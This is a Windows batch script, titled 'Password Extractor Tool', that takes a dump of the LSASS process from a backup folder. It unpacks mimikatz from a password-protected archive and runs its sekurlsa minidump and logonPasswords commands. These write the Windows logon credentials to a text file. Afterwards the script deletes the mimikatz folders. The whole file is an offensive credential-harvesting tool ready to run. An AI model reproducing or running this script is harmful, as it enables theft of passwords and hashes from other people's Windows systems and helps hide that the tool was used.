@echo off
Title = Password Extractor Tool.
@echo Password Extractor Tool.
set CD_original=%CD%
%~d0
cd %~dp0
if not "%1"=="" set dumpfile=%1
if not "%dumpfile%"=="" (
if not exist "%dumpfile%" @echo Unable to locate "%dumpfile%"!
if not exist "%dumpfile%" pause
if not exist "%dumpfile%" exit
goto extract_data
)
set CD_original=%CD%
CD "Backups"
:backuplist
@echo Backups -------------------------------
dir /A:D /B
@echo ---------------------------------------
@echo Enter the backup directory name.
set dumpdirectory=
set /p dumpdirectory=Dir: %=%
if "%dumpdirectory%"=="" goto backuplist
if not exist "%CD%\%dumpdirectory%\WIN" @echo Failed to locate "%dumpdirectory%\WIN"!
if not exist "%CD%\%dumpdirectory%\WIN" goto backuplist
cd "%dumpdirectory%"
:dumplist
@echo Dumps ---------------------------------
dir /B *.dmp
@echo ---------------------------------------
set dumpfile=
set /p dumpfile=File: %=%
if "%dumpfile%"=="" goto dumplist
if not exist "%CD%\%dumpfile%" @echo Unable to locate "%CD%\%dumpfile%"
if not exist "%CD%\%dumpfile%" goto dumplist
set dumpfile=%CD%\%dumpfile%
CD %CD_original%
:move_dump
move /y "%dumpfile%" "%CD%\%dumpdirectory%_lsass.dmp" >nul
if not exist "%CD%\%dumpdirectory%_lsass.dmp" goto move_dump
set dumpfile2=%dumpdirectory%_lsass.dmp
:extract_data
@echo Extracting software...
"7z.exe" x -o"%CD%" -y "mimikatz.zip" -p"KHJoiy7IkignnmbmnIY986RtJSBIijIUHnjghfHccDtuj" >nul
"x32\mimikatz.exe" "sekurlsa::minidump %dumpfile2%" "sekurlsa::logonPasswords full" "exit" >> "%dumpfile%_Passwords.txt"
if not exist "%dumpfile%_Passwords.txt" @echo Failed to extract the password data.
if exist "%dumpfile%_Passwords.txt" @echo Successfully extracted the password data.
move /y "%dumpfile2%" "%dumpfile%" >nul
RD /S /Q "x32"
RD /S /Q "x64"
CD %CD_original%
pause >nul